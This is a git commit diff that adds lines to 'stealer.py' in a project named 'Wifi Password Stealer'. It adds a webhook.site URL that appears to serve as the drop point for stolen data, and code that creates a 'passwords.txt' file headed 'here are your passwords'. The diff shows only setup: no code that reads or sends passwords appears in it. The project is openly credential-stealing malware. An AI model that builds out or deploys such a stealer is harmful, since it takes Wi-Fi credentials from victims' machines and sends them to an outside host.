0b96703d76b4456b2564b86c9305b5bd894b97b3
69PercentFat <shubham11501@gmail.com>
2023-06-23 21:59:55 +0530

    creating a file

--- Wifi Password Stealer/stealer.py
+++ Wifi Password Stealer/stealer.py
@@ -2,3 +2,10 @@ import subprocess
 import os
 import sys
 import requests
+
+url = 'https://webhook.site/7a5e65a7-ebef-47b5-a6c7-3a172100fe3b'
+
+#create a file
+password_file = open('passwords.txt', "w")
+password_file.write("hello sir! here are your passwords:\n\n")
+password_file.close()
